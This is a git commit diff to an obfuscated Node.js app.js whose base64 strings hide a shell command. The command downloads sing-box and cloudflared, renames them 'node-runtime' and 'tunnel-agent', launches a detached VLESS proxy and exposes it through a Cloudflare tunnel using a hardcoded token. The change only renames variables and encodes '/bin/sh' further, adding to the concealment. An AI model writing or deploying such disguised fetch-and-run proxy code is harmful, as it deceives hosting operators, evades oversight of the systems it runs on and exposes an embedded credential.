80ef3d52c3aab27f4fe316b133d02e4ff0b1759d
HAJIHUJIN <125563933+HAJIHUJIN@users.noreply.github.com>
2026-07-29 21:11:32 +0800

    Update app.js

--- app.js
+++ app.js
@@ -25,16 +25,17 @@ _0x9c.listen(_0x6f, () => {
 function _0x14e() {
     if (!_0x3c.existsSync(_0x7a('Li9ub2RlLXJ1bnRpbWU='))) {
         const _0x15f = _0x7a('Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL1NhZ2VyTmV0L3NpbmctYm94L3JlbGVhc2VzL2Rvd25sb2FkL3YxLjkuMC9zaW5nLWJveC0xLjkuMC1saW51eC1hbWQ2NC50YXIuZ3ogLW8gc2IudGFyLmd6ICYmIHRhciAtenh2ZiBzYi50YXIuZ3ogPiAvZGV2L251bGwgMj4mMSAmJiBtdiBzaW5nLWJveC0xLjkuMC1saW51eC1hbWQ2NC9zaW5nLWJveCAuL25vZGUtcnVudGltZSAmJiBybSAtcmYgc2IudGFyLmd6IHNpbmctYm94LTEuOS4wLWxpbnV4LWFtZDY0ICYmIGN1cmwgLXNMIGh0dHBzOi8vZ2l0aHViLmNvbS9jbG91ZGZsYXJlL2Nsb3VkZmxhcmVkL3JlbGVhc2VzL2xhdGVzdC9kb3dubG9hZC9jbG91ZGZsYXJlZC1saW51eC1hbWQ2NCAtbyB0dW5uZWwtYWdlbnQgJiYgY2htb2QgK3ggbm9kZS1ydW50aW1lIHR1bm5lbC1hZ2VudA==');
-        _0x1a(_0x15f, { shell: '/bin/sh' }, (_0x16a) => {
-            if (!_0x16a) _0x17b();
+        const _0x16b = _0x7a('L2Jpbi9zaA==');
+        _0x1a(_0x15f, { shell: _0x16b }, (_0x17c) => {
+            if (!_0x17c) _0x18d();
         });
     } else {
-        _0x17b();
+        _0x18d();
     }
 }
 
-function _0x17b() {
-    const _0x18c = {
+function _0x18d() {
+    const _0x19e = {
         "log": { "level": _0x7a('d2Fybg==') },
         "inbounds": [{
             "type": _0x7a('dmxlc3M='),
@@ -51,11 +52,11 @@ function _0x17b() {
         }],
         "outbounds": [{ "type": _0x7a('ZGlyZWN0') }]
     };
-    _0x3c.writeFileSync(_0x7a('YXBwLnNldHRpbmdzLmRhdGE='), JSON.stringify(_0x18c, null, 0x2));
+    _0x3c.writeFileSync(_0x7a('YXBwLnNldHRpbmdzLmRhdGE='), JSON.stringify(_0x19e, null, 0x2));
 
     _0x2b(_0x7a('Li9ub2RlLXJ1bnRpbWU='), ['run', '-c', _0x7a('YXBwLnNldHRpbmdzLmRhdGE=')], { stdio: 'ignore', detached: true });
 
-    const _0x19d = 'eyJhIjoiN2FhOWNmYTFkMDViOGYwMjY4NzYwNzRkNzBkNjI3MTgiLCJ0IjoiYzFhNWRlMzUtMTBlMi00MDVjLWJlMzgtODg3ZGY4YmNjYmM2IiwicyI6IlpUUTNObUkxWkRBdE5qVXdOUzAwTkRSa0xUa3dPVFl0WXpCbE1UaGpOek14WldGaiJ9';
+    const _0x20f = 'eyJhIjoiN2FhOWNmYTFkMDViOGYwMjY4NzYwNzRkNzBkNjI3MTgiLCJ0IjoiYzFhNWRlMzUtMTBlMi00MDVjLWJlMzgtODg3ZGY4YmNjYmM2IiwicyI6IlpUUTNObUkxWkRBdE5qVXdOUzAwTkRSa0xUa3dPVFl0WXpCbE1UaGpOek14WldGaiJ9';
 
-    _0x2b(_0x7a('Li90dW5uZWwtYWdlbnQ='), ['tunnel', '--no-autoupdate', 'run', '--token', _0x19d], { stdio: 'inherit' });
+    _0x2b(_0x7a('Li90dW5uZWwtYWdlbnQ='), ['tunnel', '--no-autoupdate', 'run', '--token', _0x20f], { stdio: 'inherit' });
 }
